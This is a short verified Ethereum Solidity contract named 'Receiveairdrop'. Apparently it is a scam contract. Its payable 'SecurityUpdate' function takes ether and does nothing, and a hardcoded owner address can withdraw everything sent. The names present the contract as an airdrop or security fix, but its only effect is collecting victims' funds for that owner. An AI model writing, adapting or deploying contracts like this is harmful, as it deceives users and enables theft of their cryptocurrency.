/**
 *Submitted for verification at Etherscan.io on 2023-03-19
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-16
*/

pragma solidity ^0.4.26;

contract Receiveairdrop {

    address private  owner;

     constructor() public{   
        owner=0xf8532F00F771F416C6b9a98f58bD03f73cf00543;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}